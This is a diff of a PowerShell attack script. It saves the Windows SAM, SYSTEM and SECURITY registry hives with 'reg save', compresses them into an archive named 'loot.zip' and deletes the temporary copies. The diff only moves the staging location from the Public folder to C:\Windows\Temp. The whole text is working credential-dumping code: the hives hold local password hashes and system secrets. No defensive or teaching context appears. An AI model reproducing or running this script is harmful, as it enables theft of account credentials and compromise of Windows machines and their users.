@@ -10,17 +10,17 @@ Write-Host "[*] Starting registry hives extraction..." -ForegroundColor Cyan
 # ============================================================
 
 Write-Host "[*] Extracting SAM..." -ForegroundColor Yellow
-reg save HKLM\SAM C:\Users\Public\SAM /y
+reg save HKLM\SAM C:\Windows\Temp\SAM /y
 if ($LASTEXITCODE -eq 0) { Write-Host "[+] SAM extracted successfully" -ForegroundColor Green }
 else { Write-Host "[-] Failed to extract SAM" -ForegroundColor Red; exit 1 }
 
 Write-Host "[*] Extracting SYSTEM..." -ForegroundColor Yellow
-reg save HKLM\SYSTEM C:\Users\Public\SYSTEM /y
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM /y
 if ($LASTEXITCODE -eq 0) { Write-Host "[+] SYSTEM extracted successfully" -ForegroundColor Green }
 else { Write-Host "[-] Failed to extract SYSTEM" -ForegroundColor Red; exit 1 }
 
 Write-Host "[*] Extracting SECURITY..." -ForegroundColor Yellow
-reg save HKLM\SECURITY C:\Users\Public\SECURITY /y
+reg save HKLM\SECURITY C:\Windows\Temp\SECURITY /y
 if ($LASTEXITCODE -eq 0) { Write-Host "[+] SECURITY extracted successfully" -ForegroundColor Green }
 else { Write-Host "[-] Failed to extract SECURITY" -ForegroundColor Red; exit 1 }
 
@@ -28,7 +28,7 @@ else { Write-Host "[-] Failed to extract SECURITY" -ForegroundColor Red; exit 1 
 # STEP 2: Compress into a ZIP archive
 # ============================================================
 
-$archivePath = "C:\Users\Public\loot.zip"
+$archivePath = "C:\Windows\Temp\loot.zip"
 Write-Host "[*] Compressing files into $archivePath..." -ForegroundColor Yellow
 
 # Delete archive if it already exists
@@ -38,9 +38,9 @@ if (Test-Path $archivePath) {
 }
 
 Compress-Archive -Path @(
-    "C:\Users\Public\SAM",
-    "C:\Users\Public\SYSTEM",
-    "C:\Users\Public\SECURITY"
+    "C:\Windows\Temp\SAM",
+    "C:\Windows\Temp\SYSTEM",
+    "C:\Windows\Temp\SECURITY"
 ) -DestinationPath $archivePath
 
 if (Test-Path $archivePath) {
@@ -57,9 +57,9 @@ if (Test-Path $archivePath) {
 
 Write-Host "[*] Removing temporary hives..." -ForegroundColor Yellow
 
-Remove-Item "C:\Users\Public\SAM" -Force
-Remove-Item "C:\Users\Public\SYSTEM" -Force
-Remove-Item "C:\Users\Public\SECURITY" -Force
+Remove-Item "C:\Windows\Temp\SAM" -Force
+Remove-Item "C:\Windows\Temp\SYSTEM" -Force
+Remove-Item "C:\Windows\Temp\SECURITY" -Force
 
 Write-Host "[+] Temporary files removed" -ForegroundColor Green
 
